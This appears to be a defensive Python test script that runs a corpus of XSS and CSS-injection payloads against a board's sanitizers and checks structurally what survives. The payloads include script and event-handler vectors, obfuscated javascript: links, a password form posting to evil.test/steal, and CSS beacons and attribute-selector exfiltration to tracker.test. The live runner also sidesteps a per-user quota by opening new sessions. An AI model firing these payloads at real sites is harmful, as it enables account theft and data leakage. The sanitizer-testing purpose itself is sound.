#!/usr/bin/env python3
"""Fire known injection payloads at the station and report what survived.

This is a defensive tool for the board in this directory: it is the corpus the
sanitizers are supposed to defeat, kept runnable so a change to `sanitize.py`
can be checked against it in one command.

    python3 redteam.py                              # offline, against sanitize.py
    python3 redteam.py --url http://127.0.0.1:8080  # end-to-end, against a station
    python3 redteam.py --show                       # also print what survived

A payload is NEUTRALIZED when the sanitized output holds no executable surface:
re-parsed, it contains only allowlisted tags and attributes, only fetchable-and-
inert URL schemes, and -- for ciphers -- no "<" and nothing that can fetch.

Note that escaped text is not a leak. `&lt;script&gt;alert(1)&lt;/script&gt;`
contains the substring "alert(1)" and is perfectly safe, which is why every
check here is structural rather than a substring scan.
"""

import argparse
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from http.cookiejar import CookieJar

import sanitize

MARKUP = "markup"
CIPHER = "cipher"


class Payload:
    __slots__ = ("kind", "probes", "value", "must_survive")

    def __init__(self, kind, probes, value, must_survive=()):
        self.kind = kind
        self.probes = probes      # what the vector is trying to achieve
        self.value = value
        # Control cases. Without these a sanitizer that returned "" for every
        # input would score a perfect run, so the corpus also pins down what
        # must NOT be destroyed.
        self.must_survive = must_survive


# ---------------------------------------------------------------------------
# markup vectors -- courier "Message" field
# ---------------------------------------------------------------------------

MARKUP_PAYLOADS = [
    Payload(MARKUP, "plain script element", "<script>alert(1)</script>"),
    Payload(MARKUP, "script with attribute noise", "<script/src=data:,alert(1)></script>"),
    Payload(MARKUP, "uppercase / mixed case tag", "<ScRiPt>alert(1)</ScRiPt>"),
    Payload(MARKUP, "script split by a comment", "<!--><script>alert(1)</script>"),
    Payload(MARKUP, "unclosed script swallowing the page", "<script>alert(1)"),
    Payload(MARKUP, "img onerror", '<img src=x onerror=alert(1)>'),
    Payload(MARKUP, "img with no quotes at all", "<img src=x onerror=alert(1)//>"),
    Payload(MARKUP, "svg onload", "<svg onload=alert(1)>"),
    Payload(MARKUP, "svg namespace confusion", "<svg><script>alert(1)</script></svg>"),
    Payload(MARKUP, "math namespace", "<math><mtext><script>alert(1)</script></mtext></math>"),
    Payload(MARKUP, "body onload via unwrapping", "<body onload=alert(1)>"),
    Payload(MARKUP, "autofocus onfocus", "<input autofocus onfocus=alert(1)>"),
    Payload(MARKUP, "details ontoggle", "<details open ontoggle=alert(1)>x</details>"),
    Payload(MARKUP, "marquee onstart", "<marquee onstart=alert(1)>x</marquee>"),
    Payload(MARKUP, "handler on an allowed tag", '<p onclick="alert(1)" onmouseover=alert(1)>x</p>'),
    Payload(MARKUP, "handler with newline before =", "<p onclick\n=alert(1)>x</p>"),
    Payload(MARKUP, "backtick-quoted attribute", "<p onclick=`alert(1)`>x</p>"),
    Payload(MARKUP, "javascript: href", '<a href="javascript:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: mixed case", '<a href="JaVaScRiPt:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: split by a tab", '<a href="java\tscript:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: split by a newline", '<a href="java\nscript:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: with a leading control char", '<a href="\x01javascript:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: as an entity", '<a href="&#106;avascript:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: as a hex entity", '<a href="&#x6a;avascript:alert(1)">go</a>'),
    Payload(MARKUP, "javascript: padded with a zero-width space", '<a href="​javascript:alert(1)">go</a>'),
    Payload(MARKUP, "vbscript: href", '<a href="vbscript:msgbox(1)">go</a>'),
    Payload(MARKUP, "data: URI document", '<a href="data:text/html,<script>alert(1)</script>">go</a>'),
    Payload(MARKUP, "iframe with a remote src", '<iframe src="http://evil.test/"></iframe>'),
    Payload(MARKUP, "iframe srcdoc", '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'),
    Payload(MARKUP, "object data", '<object data="http://evil.test/x.swf"></object>'),
    Payload(MARKUP, "embed src", '<embed src="http://evil.test/x">'),
    Payload(MARKUP, "remote image beacon", '<img src="http://tracker.test/pixel.gif">'),
    Payload(MARKUP, "video poster beacon", '<video poster="http://tracker.test/p.jpg"></video>'),
    Payload(MARKUP, "audio source beacon", '<audio><source src="http://tracker.test/a.mp3"></audio>'),
    Payload(MARKUP, "credential-harvesting form", '<form action="http://evil.test/steal">'
                                                 '<input name="password" type="password">'
                                                 '<button>Sign in</button></form>'),
    Payload(MARKUP, "formaction on a button", '<button formaction="javascript:alert(1)">go</button>'),
    Payload(MARKUP, "base href hijack", '<base href="http://evil.test/">'),
    Payload(MARKUP, "meta refresh redirect", '<meta http-equiv="refresh" content="0;url=http://evil.test/">'),
    Payload(MARKUP, "link stylesheet", '<link rel="stylesheet" href="http://evil.test/x.css">'),
    Payload(MARKUP, "style element with a fetch", "<style>body{background:url(http://tracker.test/p)}</style>"),
    Payload(MARKUP, "style attribute with a fetch", '<p style="background:url(http://tracker.test/p)">x</p>'),
    Payload(MARKUP, "style attribute with expression()", '<p style="width:expression(alert(1))">x</p>'),
    Payload(MARKUP, "noscript wrapper", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"),
    Payload(MARKUP, "template element", "<template><script>alert(1)</script></template>"),
    Payload(MARKUP, "mXSS via nested quotes", '<p title="</p><script>alert(1)</script>">x</p>'),
    Payload(MARKUP, "attribute value closing the tag", '<a href="x" onmouseover="alert(1)" x="">go</a>'),
    Payload(MARKUP, "null byte in tag name", "<scr\x00ipt>alert(1)</scr\x00ipt>"),
    Payload(MARKUP, "CDATA section", "<![CDATA[<script>alert(1)</script>]]>"),
    Payload(MARKUP, "processing instruction", "<?php echo '<script>alert(1)</script>'; ?>"),
    Payload(MARKUP, "doctype declaration", "<!DOCTYPE html><script>alert(1)</script>"),
    Payload(MARKUP, "protocol-relative link", '<a href="//evil.test/phish">bank login</a>'),
    Payload(MARKUP, "deeply nested tags", "<div>" * 300 + "x" + "</div>" * 300),
    Payload(MARKUP, "unbalanced closers escaping context", "<div><b>x</div></b></p></div></body></html>"),
    Payload(MARKUP, "class/id used to target injected css", '<p class="a b" id="target">x</p>',
            must_survive=('class="a b"', 'id="target"')),
    Payload(MARKUP, "legitimate rich text (control)",
            "<p>Chalk mark <b>under the third slat</b>.</p>"
            "<blockquote>If the bench is wet, the drop is burned.</blockquote>"
            "<ul><li>one</li><li>two</li></ul>",
            must_survive=("<b>under the third slat</b>", "<blockquote>", "<li>two</li>")),
    Payload(MARKUP, "legitimate outbound link (control)",
            '<a href="https://example.test/notes">the notes</a>',
            must_survive=('href="https://example.test/notes"', "nofollow")),
]

# ---------------------------------------------------------------------------
# cipher vectors -- courier "Envelope cipher" field
# ---------------------------------------------------------------------------

CIPHER_PAYLOADS = [
    Payload(CIPHER, "url() beacon", "body{background:url(http://tracker.test/p.png)}"),
    Payload(CIPHER, "url() uppercase", "body{background:URL('http://tracker.test/p.png')}"),
    Payload(CIPHER, "url() with inner whitespace", "body{background:url\n(  http://tracker.test/p )}"),
    Payload(CIPHER, "url() split by a comment", "body{background:u/**/rl(http://tracker.test/p)}"),
    Payload(CIPHER, "url() via a backslash escape", r"body{background:\75 rl(http://tracker.test/p)}"),
    Payload(CIPHER, "@import remote sheet", '@import "http://tracker.test/x.css";'),
    Payload(CIPHER, "@import url() form", "@import url(http://tracker.test/x.css);"),
    Payload(CIPHER, "@font-face remote src", "@font-face{font-family:x;src:url(http://tracker.test/f.woff)}"),
    Payload(CIPHER, "image-set() beacon", "body{background-image:image-set(url(http://tracker.test/a) 1x)}"),
    Payload(CIPHER, "element() reference", "body{background:element(#target)}"),
    Payload(CIPHER, "cursor url beacon", "body{cursor:url(http://tracker.test/c.cur),auto}"),
    Payload(CIPHER, "list-style-image beacon", "li{list-style-image:url(http://tracker.test/b.png)}"),
    Payload(CIPHER, "IE expression()", "body{width:expression(alert(1))}"),
    Payload(CIPHER, "-moz-binding XBL", "body{-moz-binding:url(http://evil.test/b.xml#x)}"),
    Payload(CIPHER, "behavior HTC", "body{behavior:url(#default#time2)}"),
    Payload(CIPHER, "javascript: in a value", "body{background:javascript:alert(1)}"),
    Payload(CIPHER, "style element breakout via @media", "@media </style><script>alert(1)</script>{a{color:red}}"),
    Payload(CIPHER, "style element breakout via content", 'a{content:"</style><script>alert(1)</script>"}'),
    Payload(CIPHER, "style element breakout via selector", "a[x='</style><script>alert(1)</script>']{color:red}"),
    Payload(CIPHER, "bare breakout before any rule", "</style><script>alert(1)</script>{}"),
    Payload(CIPHER, "attr() reading page state", 'a::after{content:attr(href)}'),
    Payload(CIPHER, "attribute-selector exfiltration", 'input[value^="a"]{background:url(http://tracker.test/a)}'),
    Payload(CIPHER, "fixed overlay clickjack", "body{position:fixed;inset:0;z-index:99999;background:#fff}"),
    Payload(CIPHER, "stray brace reopening a block", "a{color:red} } script{display:block}"),
    Payload(CIPHER, "unterminated block", "a{color:red"),
    Payload(CIPHER, "unterminated string", 'a{content:"unclosed'),
    Payload(CIPHER, "nested at-rule bomb", "@media screen{" * 50 + "a{color:red}" + "}" * 50),
    Payload(CIPHER, "legitimate cipher (control)",
            "body{background:#120b06;color:#f2b04e}"
            "p{border-left:2px solid #f2b04e;padding-left:10px}",
            must_survive=("background: #120b06", "border-left: 2px solid #f2b04e")),
    Payload(CIPHER, "legitimate media query (control)",
            "@media (max-width:600px){body{font-size:12px}}",
            must_survive=("@media (max-width:600px)", "font-size: 12px")),
    Payload(CIPHER, "legitimate keyframes (control)",
            "@keyframes pulse{from{opacity:0}to{opacity:1}}p{animation:pulse 2s infinite}",
            must_survive=("@keyframes pulse", "animation: pulse 2s infinite")),
]

PAYLOADS = MARKUP_PAYLOADS + CIPHER_PAYLOADS


# ---------------------------------------------------------------------------
# verdicts
# ---------------------------------------------------------------------------

class _Auditor(HTMLParser):
    """Re-parse sanitized markup and record any executable surface left in it."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.problems = []

    def handle_starttag(self, tag, attrs):
        if tag not in sanitize.ALLOWED_TAGS:
            self.problems.append("tag <%s>" % tag)
        permitted = (sanitize.GLOBAL_ATTRS | sanitize.TAG_ATTRS.get(tag, set())
                     | {"rel", "target"})
        for name, value in attrs:
            value = value or ""
            if name.startswith("on") or name not in permitted:
                self.problems.append("attr %s=" % name)
            if name in ("href", "cite") and not value.lower().startswith(
                    ("http://", "https://", "mailto:", "#", "/")):
                self.problems.append("scheme %r" % value[:40])
            if name == "style":
                low = value.lower()
                if "url(" in low or "expression(" in low:
                    self.problems.append("style %r" % value[:40])

    handle_startendtag = handle_starttag


CIPHER_FORBIDDEN = ("<", "url(", "@import", "expression(", "-moz-binding",
                    "behavior:", "javascript:", "image-set(", "element(",
                    "attr(", "\\")


def judge(payload, output):
    """Return (passed, problems) for one sanitized result."""
    if payload.kind == MARKUP:
        auditor = _Auditor()
        auditor.feed(output)
        auditor.close()
        problems = list(auditor.problems)
    else:
        problems = [token for token in CIPHER_FORBIDDEN if token in output.lower()]
    # A control case fails by being over-sanitized, not by leaking.
    problems += ["destroyed %r" % expected
                 for expected in payload.must_survive if expected not in output]
    return (not problems), problems


# ---------------------------------------------------------------------------
# runners
# ---------------------------------------------------------------------------

def run_offline(payloads):
    """Push each payload through the sanitizers directly."""
    for payload in payloads:
        if payload.kind == MARKUP:
            output = sanitize.sanitize_html(payload.value)
        else:
            output = sanitize.sanitize_css(payload.value)
        yield payload, output


class Station:
    """A courier session against a live station."""

    def __init__(self, base):
        self.base = base.rstrip("/")
        self.new_session()

    def new_session(self):
        """Drop the cookie and come back as a courier the station has not met."""
        self.opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}),
            urllib.request.HTTPCookieProcessor(CookieJar()),
        )

    def _read(self, url):
        with self.opener.open(url) as response:
            return response.read().decode("utf-8", "replace"), response.geturl()

    def csrf(self):
        body, _ = self._read(self.base + "/")
        match = re.search(r'name="_csrf" value="([^"]+)"', body)
        if not match:
            raise RuntimeError("no CSRF token at %s/ -- is that a station?" % self.base)
        return match.group(1)

    def leave(self, title, body, css):
        """Post a drop; return its id, or None when the station refused it."""
        data = urllib.parse.urlencode(
            {"_csrf": self.csrf(), "title": title, "body": body, "css": css}
        ).encode("utf-8")
        request = urllib.request.Request(self.base + "/post", data=data, method="POST")
        page, final_url = "", ""
        try:
            with self.opener.open(request) as response:
                page, final_url = response.read().decode("utf-8", "replace"), response.geturl()
        except urllib.error.HTTPError as error:
            return None, "HTTP %d" % error.code
        match = re.search(r"/d/([a-z2-9]+)", final_url)
        if not match:
            reason = re.search(r'<p class="notice bad">(.*?)</p>', page, re.S)
            return None, re.sub(r"<[^>]+>|\s+", " ", reason.group(1)).strip() if reason \
                else "refused at the counter"
        return match.group(1), None

    def envelope_body(self, drop_id):
        document, _ = self._read("%s/d/%s/envelope" % (self.base, drop_id))
        body = re.search(r"<body>(.*)</body>", document, re.S)
        cipher = re.findall(r"<style>(.*?)</style>", document, re.S)
        return (body.group(1).strip() if body else ""), (cipher[-1] if cipher else "")


# The station's own defences, which are not verdicts about a payload.
ADDRESS_LIMIT = "too many manifests"   # per client address, clears with time
HANDLE_QUOTA = "hourly quota"          # per courier handle, clears with a new one


def run_live(payloads, base, wait=False):
    """Post each payload as a real drop and read the envelope back.

    Yields ``(payload, output, skipped)``. A drop the station refuses on its
    merits is a pass -- nothing was stored, so nothing can render. A drop it
    refuses because we are posting too fast is neither a pass nor a leak, so it
    is reported as skipped rather than quietly counted as a win.
    """
    import time

    station = Station(base)
    for index, payload in enumerate(payloads):
        title = "redteam %03d" % index
        body = payload.value if payload.kind == MARKUP else "<p>cipher probe</p>"
        css = "" if payload.kind == MARKUP else payload.value

        drop_id = refusal = None
        for _ in range(40):
            drop_id, refusal = station.leave(title, body, css)
            if drop_id is not None:
                break
            reason = (refusal or "").lower()
            if HANDLE_QUOTA in reason:
                station.new_session()   # come back as a different courier
                continue
            if ADDRESS_LIMIT in reason and wait:
                time.sleep(20)          # let the station's window roll forward
                continue
            break

        if drop_id is None:
            reason = (refusal or "").lower()
            if ADDRESS_LIMIT in reason or HANDLE_QUOTA in reason:
                yield payload, None, refusal
            else:
                yield payload, "// refused: %s" % refusal, None
            continue

        markup, cipher = station.envelope_body(drop_id)
        yield payload, (markup if payload.kind == MARKUP else cipher), None


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    parser.add_argument("--url", help="run end-to-end against a live station")
    parser.add_argument("--kind", choices=(MARKUP, CIPHER), help="only one class of vector")
    parser.add_argument("--show", action="store_true", help="print what survived sanitizing")
    parser.add_argument("--wait", action="store_true",
                        help="with --url, pace the run against the station's rate limits")
    args = parser.parse_args(argv)

    payloads = [p for p in PAYLOADS if not args.kind or p.kind == args.kind]
    if args.url:
        runner = run_live(payloads, args.url, wait=args.wait)
        where = args.url
    else:
        runner = ((payload, output, None) for payload, output in run_offline(payloads))
        where = "sanitize.py (offline)"
    print("POSTE RESTANTE // red team -- %d payloads against %s\n" % (len(payloads), where))

    leaked, skipped = [], []
    for payload, output, skip in runner:
        if skip is not None:
            skipped.append((payload, skip))
            print("[ skip ] %-8s %s\n         -> %s" % (payload.kind, payload.probes, skip))
            continue
        passed, problems = judge(payload, output)
        print("[%s] %-8s %s" % ("  ok  " if passed else " LEAK ", payload.kind, payload.probes))
        if not passed:
            leaked.append((payload, output, problems))
            print("         -> %s" % ", ".join(problems))
        if args.show:
            print("         survived: %s" % (output[:160].replace("\n", " ") or "(nothing)"))

    tested = len(payloads) - len(skipped)
    print("\n%d/%d neutralized, %d skipped." % (tested - len(leaked), tested, len(skipped)))
    if skipped:
        print("Skipped payloads hit the station's own rate limits, so they were never "
              "tested.\nRe-run with --wait to pace against them, or --kind to take one "
              "class at a time.")
    if leaked:
        print("LEAKED:")
        for payload, output, problems in leaked:
            print("  - %s: %s" % (payload.probes, ", ".join(problems)))
            print("    payload:  %s" % payload.value[:200])
            print("    survived: %s" % output[:200])
    return 1 if leaked else 0


if __name__ == "__main__":
    sys.exit(main())
